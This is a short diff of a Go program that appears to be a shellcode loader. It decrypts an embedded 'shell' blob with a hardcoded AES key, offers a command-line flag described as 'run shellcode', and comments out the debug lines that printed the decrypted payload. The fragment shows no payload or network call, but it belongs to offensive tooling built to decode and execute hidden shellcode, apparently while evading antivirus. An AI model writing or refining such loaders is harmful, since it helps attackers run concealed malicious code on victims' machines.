@@ -6,9 +6,7 @@ import (
 	"crypto/des"
 	"crypto/rc4"
 	"encoding/base64"
-	"encoding/hex"
 	"flag"
-	"fmt"
 	"log"
 	"os"
 	"strings"
@@ -124,10 +122,10 @@ func main() {
 			//AES解密
 			shell = AesDecryptCBC(shell, []byte("yoolaescbcuuyool"))
 		}
-		fmt.Println(slice[i])
+		//fmt.Println(slice[i])
 	}
 
-	fmt.Println(hex.EncodeToString(shell))
+	//fmt.Println(hex.EncodeToString(shell))
 	//fmt.Println(len(os.Args))
 	//loader.exe -fuck
 	flag.BoolVar(&fuck, "fuck", false, "run shellcode")
